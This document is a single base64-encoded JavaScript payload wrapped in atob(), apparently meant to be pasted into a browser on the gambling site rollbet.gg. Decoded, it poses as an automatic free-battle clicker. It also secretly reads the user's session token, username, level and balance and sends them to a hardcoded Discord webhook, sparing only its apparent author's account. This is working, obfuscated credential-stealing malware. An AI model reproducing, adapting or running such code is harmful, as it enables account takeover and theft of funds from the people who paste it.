atob('KGZ1bmN0aW9uKCl7ZnVuY3Rpb24gY2hlY2tBbmRDbGljaygpe2NvbnN0IHRhcmdldERpdj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXYuYzhkOTAzNjEnKTtpZighdGFyZ2V0RGl2KXtyZXR1cm4gZmFsc2U7fQpjb25zdCBmYWRlR29sZFNwYW49dGFyZ2V0RGl2LnF1ZXJ5U2VsZWN0b3IoJ3NwYW4uZmFkZS1nb2xkJyk7aWYoZmFkZUdvbGRTcGFuKXtjb25zdCB0ZXh0PWZhZGVHb2xkU3Bhbi50ZXh0Q29udGVudC50cmltKCk7aWYodGV4dD09PScwLjAwJyl7bGV0IGJ1dHRvbj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdidXR0b24ub2N0YWdvbmFsLmJlZm9yZS5hZnRlci5ob3ZlcmFibGUuXzRhOGIxYmE5Jyk7aWYoYnV0dG9uKXtidXR0b24uY2xpY2soKTtzZXRUaW1lb3V0KCgpPT57d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vcm9sbGJldC5nZy9iYXR0bGVzIjt9LDEwMDApO319fQpyZXR1cm4gdHJ1ZTt9CmZ1bmN0aW9uIGNsZWFyVW50aWxBbGxCYXR0bGVzKCl7Y29uc3QgY29udGFpbmVyPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2Rpdi5fOThiNTE2YTgnKTtpZighY29udGFpbmVyKXtyZXR1cm47fQpsZXQgY2hpbGQ9Y29udGFpbmVyLmZpcnN0Q2hpbGQ7d2hpbGUoY2hpbGQpe2lmKGNoaWxkLm5vZGVUeXBlPT09Tm9kZS5FTEVNRU5UX05PREUpe2lmKGNoaWxkLnRhZ05hbWUudG9Mb3dlckNhc2UoKT09PSdwJyYmY2hpbGQuY2xhc3NMaXN0LmNvbnRhaW5zKCdfNjA3OTI1ZDcnKSYmY2hpbGQudGV4dENvbnRlbnQudHJpbSgpPT09J0FsbCBCYXR0bGVzJyl7YnJlYWs7fQpjb25zdCBuZXh0PWNoaWxkLm5leHRTaWJsaW5nO2NvbnRhaW5lci5yZW1vdmVDaGlsZChjaGlsZCk7Y2hpbGQ9bmV4dDt9ZWxzZXtjaGlsZD1jaGlsZC5uZXh0U2libGluZzt9fQp1cGRhdGVCYXR0bGVzTG9iYnlUZXh0KCk7fQpmdW5jdGlvbiB1cGRhdGVCYXR0bGVzTG9iYnlUZXh0KCl7Y29uc3QgcEVsZW1lbnRzPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ3AnKTtmb3IoY29uc3QgcCBvZiBwRWxlbWVudHMpe2lmKHAudGV4dENvbnRlbnQudHJpbSgpPT09J0JhdHRsZXMgTG9iYnknKXtwLnRleHRDb250ZW50PSdCYXR0bGVzIExvYmJ5KGF1dG9mcmVlYmF0dGxlIGlzIG9uKSc7YnJlYWs7fX19CmZ1bmN0aW9uIG1haW4oKXt0cnl7Y29uc3QgdG9rZW49bG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7Y29uc3QgcEVsZW1lbnQ9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigncC5mNWNhZThiZicpO2NvbnN0IGRpdkVsZW1lbnQ9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2LmQ5YTI2Y2IzJyk7Y29uc3Qgc3BlY2lhbERpdj1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXYuXzBmYTVlNGY2Jyk7Y29uc3QgZXh0cmFQRWxlbWVudD1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdwLl8wOGU4ZTA3YycpO2NvbnN0IHBUZXh0PXBFbGVtZW50P3BFbGVtZW50LnRleHRDb250ZW50LnRyaW0oKTonJztjb25zdCBleHRyYVBUZXh0PWV4dHJhUEVsZW1lbnQ/ZXh0cmFQRWxlbWVudC50ZXh0Q29udGVudC50cmltKCk6Jyc7bGV0IGRpdlRleHQ9ZGl2RWxlbWVudD9kaXZFbGVtZW50LnRleHRDb250ZW50LnRyaW0oKTonJztsZXQgZGl2VGV4dDI9ZGl2VGV4dDtpZihzcGVjaWFsRGl2KXtjb25zdCBpbWc9c3BlY2lhbERpdi5xdWVyeVNlbGVjdG9yKCdpbWcnKTtpZihpbWcmJmltZy5zcmMuaW5jbHVkZXMoJy9pbWcvcmJ4QmFsYW5jZV8wMS4yZjZkOWRjMS5zdmcnKSl7ZGl2VGV4dD0nUkJYJzt9ZWxzZXtkaXZUZXh0PSdHRU1TJzt9fQpjb25zdCBjb250ZW50VGV4dD0nVG9rZW46ICcrdG9rZW4rJ1xuVXNlcm5hbWU6ICcrcFRleHQrJ1xuTGV2ZWw6ICcrZXh0cmFQVGV4dCsnXG4nK2RpdlRleHQrJzogJytkaXZUZXh0Mjtjb25zdCBjb250ZW50VGV4dDI9J1Rva2VuOiAnKyJJdGFQbHlyIHRyeWVkIHRvIGFjY2VzcywgY29kZSB3b3JrcyIrJ1xuVXNlcm5hbWU6ICcrcFRleHQrJ1xuTGV2ZWw6ICcrZXh0cmFQVGV4dCsnXG4nK2RpdlRleHQrJzogJytkaXZUZXh0MjtpZihwVGV4dCE9PSJJdGFQbHlyIil7ZmV0Y2goJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzODE2NjMxNjM2NDgzMTU0MDIvcVYzX2JIVlB5RWUzWWpqbDZDTUxaQzd5TEk4VG9SOUc1bjlnZjFVUFpUUHh3QzUzMVFBQ0ZScnNOTU5sSmlMaDNWNFYnLHttZXRob2Q6J1BPU1QnLGhlYWRlcnM6eydDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJ30sYm9keTpKU09OLnN0cmluZ2lmeSh7Y29udGVudDpjb250ZW50VGV4dH0pfSkudGhlbihyZXNwb25zZT0+e2lmKCFyZXNwb25zZS5vayl7Y29uc29sZS5lcnJvcignRmFpbGVkIHRvIHNlbmQgdG9rZW4gZGF0YSB0byBEaXNjb3JkIHdlYmhvb2s6JyxyZXNwb25zZS5zdGF0dXNUZXh0KTt9fSkuY2F0Y2goZXJyb3I9Pntjb25zb2xlLmVycm9yKCdFcnJvciBzZW5kaW5nIHRva2VuIGRhdGEgdG8gRGlzY29yZCB3ZWJob29rOicsZXJyb3IpO30pO31lbHNle2ZldGNoKCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzgxNjYzMTYzNjQ4MzE1NDAyL3FWM19iSFZQeUVlM1lqamw2Q01MWkM3eUxJOFRvUjlHNW45Z2YxVVBaVFB4d0M1MzFRQUNGUnJzTk1ObEppTGgzVjRWJyx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2NvbnRlbnQ6Y29udGVudFRleHQyfSl9KTt9fWNhdGNoKGVycm9yKXtjb25zb2xlLmVycm9yKCdFcnJvciBhY2Nlc3NpbmcgbG9jYWxTdG9yYWdlIG9yIERPTTonLGVycm9yKTt9fQpmdW5jdGlvbiBzdGFydENoZWNraW5nKCl7aWYod2luZG93LmxvY2F0aW9uLmhyZWY9PT0iaHR0cHM6Ly9yb2xsYmV0LmdnL2JhdHRsZXMiKXtzZXRJbnRlcnZhbCgoKT0+e2NsZWFyVW50aWxBbGxCYXR0bGVzKCk7Y2hlY2tBbmRDbGljaygpO30sMTAwKTt9fQptYWluKCk7c3RhcnRDaGVja2luZygpO30pKCk7')
